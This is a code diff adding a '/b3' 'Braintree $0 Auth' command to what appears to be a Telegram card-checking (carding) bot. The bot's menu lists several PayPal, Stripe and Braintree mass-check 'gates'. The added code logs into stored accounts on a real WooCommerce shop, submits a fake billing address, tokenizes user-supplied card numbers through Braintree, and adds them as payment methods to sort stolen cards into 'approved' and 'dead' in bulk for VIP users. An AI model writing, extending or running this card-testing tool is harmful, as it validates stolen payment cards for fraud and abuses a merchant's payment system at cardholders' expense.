@@ -2297,6 +2297,7 @@ def cmds_command(message):
         f"  💰 /pp   » PayPal  <i>└ charge ${current_amount}</i>\n"
         "  🛡️ /vbv  » Braintree 3DS Single  <i>└ $2.00 auth</i>\n"
         "  🛡️ /vbvm » Braintree 3DS Mass  <i>└ up to 500 cards</i>\n"
+        "  🟢 /b3   » Braintree $0 Auth  <i>└ bandc gate · no charge</i>\n"
         "  ⚡ /st   » Stripe Charge  <i>└ direct · ultra fast</i>\n"
         "  🔐 /sa   » Stripe Auth Only  <i>└ no charge</i>\n"
         "  🚀 /stm  » Stripe Mass  <i>└ multiple cards</i>\n"
@@ -5544,6 +5545,318 @@ def vbvm_command(message):
         except:
             pass
     threading.Thread(target=my_function).start()
+
+# ================== /b3 — Braintree $0 Auth (bandc.com gate) ==================
+_B3_ACCOUNTS_FILE = os.path.join(os.path.dirname(__file__), 'bandc_accounts.json')
+
+def _b3_load_accounts():
+    try:
+        with open(_B3_ACCOUNTS_FILE, 'r') as f:
+            return json.load(f)
+    except Exception:
+        return []
+
+def _b3_call(card: str):
+    """Perform Braintree $0 auth via bandc.com. Returns dict {status, message, elapsed}."""
+    import time, uuid, base64, re as _re
+    from requests.adapters import HTTPAdapter
+    from urllib3.util.retry import Retry
+
+    accounts = _b3_load_accounts()
+    if not accounts:
+        return {"status": "error", "message": "No bandc accounts available", "elapsed": 0}
+
+    parts = card.split('|')
+    if len(parts) < 4:
+        return {"status": "error", "message": "Invalid card format", "elapsed": 0}
+    n, mm, yy, cvc = parts[0], parts[1], parts[2][-2:], parts[3].strip()
+
+    acc = random.choice(accounts)
+    email    = acc['email']
+    password = acc['password']
+
+    ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
+
+    session = requests.Session()
+    retry = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504], allowed_methods=False, raise_on_status=False)
+    session.mount('https://', HTTPAdapter(max_retries=retry))
+    session.headers.update({'User-Agent': ua})
+
+    t0 = time.time()
+    try:
+        # Step 1: Get login nonce
+        r = session.get('https://bandc.com/my-account/', timeout=20)
+        logen = _re.search(r'name="woocommerce-login-nonce" value="(.*?)"', r.text)
+        if not logen:
+            return {"status": "error", "message": "Login nonce not found", "elapsed": round(time.time()-t0,2)}
+
+        # Step 2: Login
+        session.post('https://bandc.com/my-account/', headers={
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://bandc.com', 'referer': 'https://bandc.com/my-account/', 'user-agent': ua
+        }, data={
+            'username': email, 'password': password,
+            'woocommerce-login-nonce': logen.group(1),
+            '_wp_http_referer': '/my-account/', 'login': 'Login',
+        }, timeout=20)
+
+        # Step 3: Update billing address
+        r = session.get('https://bandc.com/my-account/edit-address/billing/', timeout=20)
+        addr_nonce = _re.search(r'name="_wpnonce" value="(.*?)"', r.text)
+        if addr_nonce:
+            foon = '303' + ''.join(random.choices('1234567890', k=7))
+            session.post('https://bandc.com/my-account/edit-address/billing/', headers={
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://bandc.com', 'referer': 'https://bandc.com/my-account/edit-address/billing/',
+            }, data={
+                'billing_first_name': 'James', 'billing_last_name': 'Smith',
+                'billing_country': 'US', 'billing_address_1': '123 Main St',
+                'billing_city': 'New York', 'billing_state': 'NY',
+                'billing_postcode': '10001', 'billing_phone': foon,
+                'billing_email': email, 'save_address': 'Save address',
+                '_wpnonce': addr_nonce.group(1), '_wp_http_referer': '/my-account/edit-address/billing/',
+                'action': 'edit_address',
+            }, timeout=20)
+
+        # Step 4: Get Braintree client token
+        r = session.get('https://bandc.com/my-account/add-payment-method/', timeout=20)
+        ct_nonce  = _re.search(r'client_token_nonce":"([^"]+)"', r.text)
+        add_nonce = _re.search(r'name="_wpnonce" value="(.*?)"', r.text)
+        if not ct_nonce or not add_nonce:
+            return {"status": "error", "message": "Could not get client token nonce", "elapsed": round(time.time()-t0,2)}
+
+        r2 = session.post('https://bandc.com/wp-admin/admin-ajax.php', headers={
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://bandc.com', 'x-requested-with': 'XMLHttpRequest',
+        }, data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': ct_nonce.group(1)}, timeout=20)
+        enc = r2.json().get('data', '')
+        dec = base64.b64decode(enc).decode('utf-8')
+        auth_fp = _re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
+        if not auth_fp:
+            return {"status": "error", "message": "Auth fingerprint not found", "elapsed": round(time.time()-t0,2)}
+
+        # Step 5: Tokenize card via Braintree GraphQL
+        r3 = session.post('https://payments.braintree-api.com/graphql', headers={
+            'authorization': f'Bearer {auth_fp[0]}', 'braintree-version': '2018-05-10',
+            'content-type': 'application/json', 'origin': 'https://assets.braintreegateway.com',
+        }, json={
+            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': str(uuid.uuid4())},
+            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
+            'variables': {'input': {'creditCard': {'number': n, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvc}, 'options': {'validate': False}}},
+            'operationName': 'TokenizeCreditCard',
+        }, timeout=20)
+        tok_data = r3.json()
+        if 'errors' in tok_data:
+            err_msg = tok_data['errors'][0].get('message', 'Tokenization failed')
+            return {"status": "dead", "message": err_msg, "elapsed": round(time.time()-t0,2)}
+        tok = tok_data['data']['tokenizeCreditCard']['token']
+
+        # Step 6: Add payment method to bandc.com
+        r4 = session.post('https://bandc.com/my-account/add-payment-method/', headers={
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://bandc.com', 'referer': 'https://bandc.com/my-account/add-payment-method/',
+        }, data={
+            'payment_method': 'braintree_credit_card',
+            'wc-braintree-credit-card-card-type': 'master-card',
+            'wc-braintree-credit-card-3d-secure-enabled': '',
+            'wc-braintree-credit-card-3d-secure-verified': '',
+            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+            'wc_braintree_credit_card_payment_nonce': tok,
+            'wc_braintree_device_data': '',
+            'wc-braintree-credit-card-tokenize-payment-method': 'true',
+            '_wpnonce': add_nonce.group(1),
+            '_wp_http_referer': '/my-account/add-payment-method/',
+            'woocommerce_add_payment_method': '1',
+        }, timeout=20)
+        text = r4.text
+        elapsed = round(time.time()-t0, 2)
+
+        # Step 7: Parse result
+        sc_match = _re.search(r'Status code\s*(.+?)<\/', text)
+        if sc_match:
+            sc = sc_match.group(1).strip()
+            if '1000' in sc or 'Approved' in sc.lower():
+                return {"status": "approved", "message": sc, "elapsed": elapsed}
+            return {"status": "dead", "message": sc, "elapsed": elapsed}
+
+        if any(x in text for x in ('Payment method successfully added', 'Nice! New payment method added',
+                                    '1000: Approved', 'Approved', 'successfully', 'Insufficient Funds',
+                                    'avs', 'Duplicate', 'changed')):
+            msg = 'Approved — $0 Auth'
+            if 'Insufficient Funds' in text: msg = 'Insufficient Funds'
+            elif 'Duplicate' in text:        msg = 'Duplicate'
+            elif 'avs' in text:              msg = 'AVS Mismatch'
+            return {"status": "approved", "message": msg, "elapsed": elapsed}
+
+        if 'risk_threshold' in text:
+            return {"status": "error", "message": "Risk threshold — retry later", "elapsed": elapsed}
+        if 'Please wait for 20 seconds' in text:
+            return {"status": "error", "message": "Rate limited — wait 20s", "elapsed": elapsed}
+        if 'woocommerce-error' in text:
+            err = _re.search(r'<li>(.*?)</li>', text[text.find('woocommerce-error'):])
+            msg = err.group(1)[:80] if err else 'Card declined'
+            from bs4 import BeautifulSoup
+            msg = BeautifulSoup(msg, 'html.parser').get_text()[:80]
+            return {"status": "dead", "message": msg, "elapsed": elapsed}
+        return {"status": "dead", "message": "Unknown response", "elapsed": elapsed}
+
+    except Exception as e:
+        return {"status": "error", "message": str(e)[:80], "elapsed": round(time.time()-t0,2)}
+
+
+@bot.message_handler(commands=["b3"])
+def b3_command(message):
+    def my_function():
+        id = message.from_user.id
+        with open("data.json", 'r', encoding='utf-8') as f:
+            json_data = json.load(f)
+        try:
+            BL = json_data[str(id)]['plan']
+        except:
+            BL = '𝗙𝗥𝗘𝗘'
+        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
+            bot.reply_to(message, "<b>❌ This command is only for VIP users.</b>", parse_mode='HTML')
+            return
+
+        # Parse card from message
+        cards = _get_cards_from_message(message)
+        if not cards:
+            bot.reply_to(message,
+                "<b>🟢 Braintree $0 Auth — bandc gate\n\n"
+                "📌 Usage:\n"
+                "/b3 4111111111111111|12|26|123\n\n"
+                "📌 Mass (one per line):\n"
+                "/b3\ncard1\ncard2\ncard3</b>", parse_mode='HTML')
+            return
+
+        if len(cards) > 50:
+            bot.reply_to(message, "<b>❌ Maximum 50 cards at a time.</b>", parse_mode='HTML')
+            return
+
+        # ── Single card ────────────────────────────────────────────────────
+        if len(cards) == 1:
+            card    = cards[0]
+            bin_num = card.replace('|','')[:6]
+            bin_info, bank, country, country_code = get_bin_info(bin_num)
+            log_command(message, query_type='gateway', gateway='b3_auth')
+            msg = bot.reply_to(message,
+                f"<b>⏳ Checking [B3 $0 Auth]...\n"
+                f"💳 Card: <code>{card}</code></b>", parse_mode='HTML')
+
+            result  = _b3_call(card)
+            s       = result.get("status", "").lower()
+            m       = result.get("message", "")
+            elapsed = result.get("elapsed", 0)
+
+            if s == "approved":
+                em, word = "✅", "Approved"
+            elif s == "dead":
+                em, word = "❌", "Dead"
+            else:
+                em, word = "🔴", "Error"
+
+            log_card_check(id, card, 'b3_auth', m[:80])
+            out = (
+                f"<b>{em} {word}  ❯  <code>{card}</code>\n"
+                f"━━━━━━━━━━━━━━━━\n"
+                f"🏦 BIN: {bin_num}  •  {bin_info}\n"
+                f"🏛️ Bank: {bank}\n"
+                f"🌍 Country: {country} {country_code}\n"
+                f"━━━━━━━━━━━━━━━━\n"
+                f"🎯 Gate: Braintree $0 Auth (bandc)\n"
+                f"💬 Msg: {m[:80]}\n"
+                f"⏱️ Time: {elapsed}s\n"
+                f"━━━━━━━━━━━━━━━━\n"
+                f"[⌤] Bot by @yadistan</b>"
+            )
+            bot.edit_message_text(out, message.chat.id, msg.message_id, parse_mode='HTML')
+            return
+
+        # ── Bulk ──────────────────────────────────────────────────────────
+        total   = len(cards)
+        approved = dead = err = checked = 0
+        results_lines = []
+        hits = []
+
+        stop_kb = types.InlineKeyboardMarkup()
+        stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
+        try:
+            stopuser[f'{id}']['status'] = 'start'
+        except:
+            stopuser[f'{id}'] = {'status': 'start'}
+
+        log_command(message, query_type='gateway', gateway='b3_auth')
+        msg = bot.reply_to(message,
+            f"<b>🟢 Braintree $0 Auth [bandc]\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"📋 Total: {total} cards\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"⏳ Starting...</b>",
+            reply_markup=stop_kb, parse_mode='HTML')
+
+        def build_b3_msg(status_text="⏳ Checking..."):
+            header = (f"<b>🟢 Braintree $0 Auth [bandc] | {status_text}\n"
+                      f"━━━━━━━━━━━━━━━━━━━━\n"
+                      f"📊 {checked}/{total} | ✅ {approved} | ❌ {dead} | 🔴 {err}\n"
+                      f"━━━━━━━━━━━━━━━━━━━━\n")
+            body = "\n".join(results_lines[-10:])
+            footer_hits = ""
+            if hits:
+                hits_lines = "".join(
+                    f"\n✅ <b>Approved</b>\n<code>{cc}</code>\n"
+                    f"<b>Msg:</b> {res.get('message','')[:80]}\n"
+                    f"<b>Time:</b> {res.get('elapsed',0):.2f}s\n"
+                    for cc, res in hits[-5:]
+                )
+                footer_hits = f"\n━━━━━━━━━━━━━━━━━━━━\n🎯 HITS ({len(hits)}):" + hits_lines
+            full = header + body + footer_hits + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] Bot by @yadistan</b>"
+            if len(full) > 4000:
+                full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n[⌤] Bot by @yadistan</b>"
+            return full
+
+        for cc in cards:
+            if stopuser.get(f'{id}', {}).get('status') == 'stop':
+                try:
+                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
+                                          text=build_b3_msg("🛑 STOPPED"), parse_mode='HTML')
+                except: pass
+                return
+
+            result  = _b3_call(cc)
+            checked += 1
+            s       = result.get("status", "").lower()
+            m_short = result.get("message", "")[:50]
+            log_card_check(id, cc, 'b3_auth', result.get('message','')[:80])
+
+            if s == "approved":
+                em, word = "✅", "Approved"
+                approved += 1
+                hits.append((cc, result))
+            elif s == "error":
+                em, word = "🔴", "Error"
+                err += 1
+            else:
+                em, word = "❌", "Dead"
+                dead += 1
+
+            results_lines.append(f"{em} <b>{word}</b> — {m_short}  ❯  <code>{cc}</code>")
+
+            if checked % 3 == 0 or checked == total:
+                try:
+                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
+                                          text=build_b3_msg(), parse_mode='HTML',
+                                          reply_markup=stop_kb)
+                    time.sleep(0.5)
+                except Exception:
+                    time.sleep(1)
+
+        try:
+            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
+                                  text=build_b3_msg("✅ DONE"), parse_mode='HTML')
+        except: pass
+
+    threading.Thread(target=my_function).start()
+
 
 # ================== /sk — Stripe SK Single Card Checker ==================
 @bot.message_handler(commands=["sk"])
